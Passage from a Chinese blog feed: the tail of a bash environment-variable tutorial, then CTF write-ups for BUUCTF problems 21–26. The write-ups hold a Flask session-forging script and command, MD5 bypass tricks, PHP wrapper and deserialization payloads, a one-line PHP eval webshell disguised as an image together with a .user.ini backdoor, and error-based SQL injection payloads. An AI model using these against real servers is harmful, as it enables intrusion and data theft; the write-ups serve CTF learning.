variable">my_variable</span><span class="token operator">=</span><span class="token string">"I am Global now"</span>$ <span class="token builtin class-name">export</span> my_variable$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now$$ <span class="token function">bash</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now$$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">"Null"</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>Null$$ <span class="token builtin class-name">exit</span><span class="token builtin class-name">exit</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>子shell甚至无法使用export命令改变父shell中全局环境变量的值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">"I am Global now"</span>$ <span class="token builtin class-name">export</span> my_variable$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now$$ <span class="token function">bash</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now$$ <span class="token assign-left variable">my_variable</span><span class="token operator">=</span><span class="token string">"Null"</span>$$ <span class="token builtin class-name">export</span> my_variable$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>Null$$ <span class="token builtin class-name">exit</span><span class="token builtin class-name">exit</span>$$ <span class="token builtin class-name">echo</span> <span class="token variable">$my_variable</span>I am Global now<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尽管子shell重新定义并导出了变量my_variable，但<strong>父shell</strong>中的my_variable变量<strong>依然保留着原先的值</strong>。 </p><h3 id="6-3-删除环境变量"><a href="#6-3-删除环境变量" class="headerlink" title="6.3 删除环境变量"></a>6.3 删除环境变量</h3><p>可以用unset命令删除已经存在的环境变量。在unset命令中引用环境变量时，记住**不要使用$**。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span>I am global nowroot@VM-16-11-debian:~<span class="token comment"># unset myvar </span>root@VM-16-11-debian:~<span class="token comment"># echo $myvar</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><p><strong>窍门</strong>     在涉及环境变量名时，记住一点就行了：如果要用到变量，使用$；如果要操作变量不适用。这条规则的一个例外就是使用printenv显示某个变量的值。  </p><hr><p>如果你是<font color="#FF5E3A" size="3">在子进程中删除了一个全局环境变量，这只对子进程有效</font>。该全局环境变量在父进程中依然可用。  </p><h3 id="6-4-设置-PATH-环境变量"><a href="#6-4-设置-PATH-环境变量" class="headerlink" title="6.4 设置 PATH 环境变量"></a>6.4 设置 PATH 环境变量</h3><p>当在shell命令行界面中输入一个外部命令时， shell必须<strong>搜索系统来找到对应的程序</strong>。 <font color="#FF5E3A" size="3">PATH环境变量定义了用于进行命令和程序查找的目录</font>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># echo $PATH</span>/usr/local/java/jdk-16.0.1+9/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<span class="token comment">#PATH中的目录使用冒号分隔。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>如果命令或者程序的位置没有包括在PATH变量中，那么如果不使用绝对路径的话， shell是没法找到的。如果shell找不到指定的命令或程序，它会产生一个错误信息：  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:~<span class="token comment"># myprog</span>-bash: myprog: <span class="token builtin class-name">command</span> not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>若要添加新的搜索目录，只需引用原来的PATH值，然后再给这个字符串添加新目录就行了。  将目录加到PATH环境变量之后，就可以在虚拟目录结构中的任何位置执行程序。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games$$ <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/home/christine/Scripts$$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/christine/Scripts$$ myprogThe factorial of <span class="token number">5</span> is <span class="token number">120</span>.$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p><strong>窍门</strong>    如果希望子shell也能找到你的程序的位置，一定要记得把修改后的PATH环境变量导出。  </p><hr><p><font color="#FF5E3A" size="3"> 这种对PATH变量的修改只能持续到退出或重启系统。这种效果并不能一直持续。</font>  </p><hr><p><font color="#FF9999" size="3">文章参考：Linux命令行与shell脚本编程大全.第3版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux6/202202051442126.jpg" style="zoom:150%;">]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf练习：21-30</title>
      <link href="/posts/myh10012.html"/>
      <url>/posts/myh10012.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="21-HCTF-2018-admin"><a href="#21-HCTF-2018-admin" class="headerlink" title="21.[HCTF 2018]admin"></a>21.[HCTF 2018]admin</h2><p>刚开始还以为是二次注入，但是发现不行。随便注册个号进去后，发现更改密码的部分存在源码，下载后看到这样一段代码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">//index.html{% include('header.html') %}{% if current_user.is_authenticated %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Hello {{ session['name'] }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% endif %}{% if current_user.is_authenticated and session['name'] == 'admin' %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>hctf{xxxxxxxxx}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% endif %}<span class="token comment">&lt;!-- you are not admin --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Welcome to hctf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>{% include('footer.html') %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到根据session中的<code>name</code>值来确定是不是admin,所以想到<font color="#FF5E3A" size="3">flask session 伪造</font>，而<font color="#FF5E3A" size="3">flask的session是在客户端的</font>，因此可以尝试进行伪造，但是伪造需要<font color="#FF5E3A" size="3">密钥</font>，发现密钥就在我们下载的文件夹里：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054285.png"></p><p>所以接下来先解密session，这里可以用一个脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#用法在终端输入：python session_decode.py your-session</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode <span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>     decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>     <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>     <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment">#解密得到：{'_fresh': True, '_id': b'd36b0289542c58199f0077265e16573dce66036e3543284e1c3b4be2fbeeb15674be6453b16bf51b3acbb744a96506026944dc1b663f8adb7673c5ebaceeb6be', 'csrf_token': b'16c4ef7f11713de97039735f894c40b4846df5de', 'image': b'j6il', 'name': '1', 'user_id': '11'}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后把name的值改为admin，在使用密钥加密一下得到session值。加密脚本（也可以解密）：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用命令：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python{2,3} flask_session_cookie_manager{2,3}.py encode -s '.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d' -t '{"number":"326410031505","username":"admin"}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054287.png"></p><p>将加密后的session重新添加到cookie中得到flag：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054289.png"></p><h2 id="22-BJDCTF2020-Easy-MD5"><a href="#22-BJDCTF2020-Easy-MD5" class="headerlink" title="22.[BJDCTF2020]Easy MD5"></a>22.[BJDCTF2020]Easy MD5</h2><p>这个题刚开始直接注啥也没有，看了一下响应头发现有东西：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054290.png"></p><p>搜索查到MD5()true参数漏洞，发现<code>ffifdyop</code>会造成漏洞：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054291.png"></p><p>输出的开头是’or’6xxxxxx 在数据库语句里就构成了select * from ‘admin’ where password= ‘’or’6xxxxxx ’ 变成永真式。然后来到levels91.php，查看源码看到：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token variable">$b</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// wow, glzjin wants a girl friend.</span><span class="token operator">--</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是简单的弱比较，绕过的答案有很多种。这里就用数组绕过:<code>a[]=1&amp;b[]=2</code>，进入到levell14.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和上一个差不多，无非就是post传参以及转别为了强比较，同样可以使用上面的数组绕过，得到flag。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054292.png"></p><p><font color="#FF5E3A" size="3">md5比较绕过：</font></p><p><a href="https://www.cnblogs.com/ainsliaea/p/15126218.html">https://www.cnblogs.com/ainsliaea/p/15126218.html</a></p><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p><h2 id="23-ZJCTF-2019-NiZhuanSiWei"><a href="#23-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="23.[ZJCTF 2019]NiZhuanSiWei"></a>23.[ZJCTF 2019]NiZhuanSiWei</h2><p>源码：<a href="https://github.com/CTFTraining/zjctf_2019_final_web_nizhuansiwei/">https://github.com/CTFTraining/zjctf_2019_final_web_nizhuansiwei/</a></p><p>考察的是PHP伪协议、以及反序列化的魔法函数。（重点是<code>data协议</code>容易忘记）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;&lt;h1&gt;"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/h1&gt;&lt;/br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span> <span class="token comment">//会触发魔法函数__tostring</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先是text参数，但是我们没有其他的文件可以读，所以使用<code>data协议</code>：</p><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p><p><strong>用法</strong>：</p><pre class="line-numbers language-awk" data-language="awk"><code class="language-awk">data://text/plain,data://text/plain;base64,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>相关伪协议i详细介绍：<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p><p>所以payload:?text=data://text/plain,welcome to the zjctf，就可以满足第一个判断。然后就要读useless.php，如果直接读无法显示，所以伪协议读取：file=php://filter/read=convert.base64-encode/resource=useless.php，读到之后解密：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 要想读到flag，就把file赋值为flag.php，然后序列化作为参数password值传进去就好。</p><h2 id="24-SUCTF-2019-CheckIn"><a href="#24-SUCTF-2019-CheckIn" class="headerlink" title="24.[SUCTF 2019]CheckIn"></a>24.[SUCTF 2019]CheckIn</h2><p>又是一个文件上传题，不过又难倒我了。首先这个题有源，先来分析一下：</p><p>源码地址：<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">if (isset($_POST["upload"])) {    $tmp_name = $_FILES["fileUpload"]["tmp_name"];    $name = $_FILES["fileUpload"]["name"];    if (!$tmp_name) {        die("filesize too big!");    }    if (!$name) {        die("filename cannot be empty!");    }    //文件后缀不能有ph开头的，并且忽略了大小写    $extension = substr($name, strrpos($name, ".") + 1);    if (preg_match("/ph|htacess/i", $extension)) {        die("illegal suffix!");    }    //文件内容中不能有"&lt;?"    if (mb_strpos(file_get_contents($tmp_name), "&lt;?") !== FALSE) {        die("<span class="token entity named-entity" title="<">&amp;lt;</span>? in contents!");    }    //exif_imagetype() 读取一个图像的第一个字节并检查其签名。可以利用利用GIF89a文件头绕过（对应jpg后缀）    $image_type = exif_imagetype($tmp_name);    if (!$image_type) {        die("exif_imagetype:not image!");    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以从上面的过滤我们可以知道要上传图片木马，制作一个图片木马shell.jpg：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token single-quoted-string string">'php'</span><span class="token operator">&gt;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是蚁剑不能连接图片文件，所以还不能直接连，在这里就卡着了。看了别人的wp可以上传一个配置文件<code>.user.ini</code></p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">GIF89a                  <span class="token constant">auto_prepend_file</span><span class="token attr-value"><span class="token punctuation">=</span>shell.jpg </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>参考链接：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p><strong>使用条件：</strong><br> (1)服务器脚本语言为PHP<br> (2)<font color="#FF5E3A" size="3">对应目录下面有可执行的php文件</font><br> (3)服务器使用CGI／FastCGI模式</p><p><code>.user.ini</code>实际上就是一个可以由用户“自定义”的<code>php.ini</code>，我们可以自定义除了<code>PHP_INI_SYSTEM</code>以外的模式，在执行php代码之前，系统会对<code>.user.ini</code>先做一个执行，然后才执行其他的php文件。</p><p>我们这边利用<code>.user,ini</code>先执行<code>auto_prepend_file</code>函数，<code>auto_prepend_file</code>表示在php程序加载第一个php代码前加载的php文件，也就是先加载了shell.jpg里面的文件，即一句话木马。</p><p>把这两个文件上传之后就可以使用蚁剑连接了，这里记住访问的时<code>index.php</code>！这样才有用，就是使用条件的第二个。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054293.png"></p><h2 id="25-极客大挑战-2019-HardSQL"><a href="#25-极客大挑战-2019-HardSQL" class="headerlink" title="25.[极客大挑战 2019]HardSQL"></a>25.[极客大挑战 2019]HardSQL</h2><p>这题要提前知道一些知识点：</p><ul><li>^  等同于 and </li><li>（）来代替空格</li><li>like  来代替=号</li></ul><p>首先尝试<code>1' #</code>，发现返回被逮住说明什么被过滤了，再次尝试<code>1'#</code>，可以了，<font color="#FF5E3A" size="3">说明过滤了空格</font>，还有一些其他被过滤的自己试试就知道了。然后根据前面的提示可知返回的都是同一报错信息，类似true和false，<font color="#FF5E3A" size="3">尝试报错注入</font>。</p><p>报错注入知识点：<a href="https://blog.csdn.net/silence1_/article/details/90812612">https://blog.csdn.net/silence1_/article/details/90812612</a></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#payload：1'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)#  //爆破数据库名1'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e),1)#   //爆破表名1'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1)# //爆破列名1'^updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1)#   //爆破数据，发现只有一半，用right函数输出另一半1'^updatexml(1,concat(0x7e,(select(right((password),30))from(H4rDsq1)),0x7e),1)#    //爆破另一段数据#left()   right()  函数，LEFT(ARG,LENGTH)、RIGHT(ARG,LENGTH)LEFT、RIGHT函数返回ARG最左边、右边的LENGTH个字符串，ARG可以是CHAR或BINARY STRING<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里注意，在爆破数据的时候，<code>select(right((password),30))from(H4rDsq1)</code>，这个<font color="red" size="3">表名绝对不可以打双引号!!!</font></p><h2 id="26-MRCTF2020-你传你🐎呢"><a href="#26-MRCTF2020-你传你🐎呢" class="headerlink" title="26.[MRCTF2020]你传你🐎呢"></a>26.[MRCTF2020]你传你🐎呢</h2><p>这个文件上传题目和上次那个checkin差不多也是修改配置文件。但是不知道为什么连正常图片都上传不了，好像只能上传一句话的图🤪</p><p>上传成功之后显示文件路径：/var/www/html/upload/3d785937f598842209769fd5c7df8958/2.jpg，但这里是绝对路径并不是我们直接添加到url后面的，一般都是/upload/3d785937f598842209769fd5c7df8958/2.jpg！</p><p>接下来就是如何解析我们的jpg文件为PHP文件，那就是更改配置文件.htaccess:</p><p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，  即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，  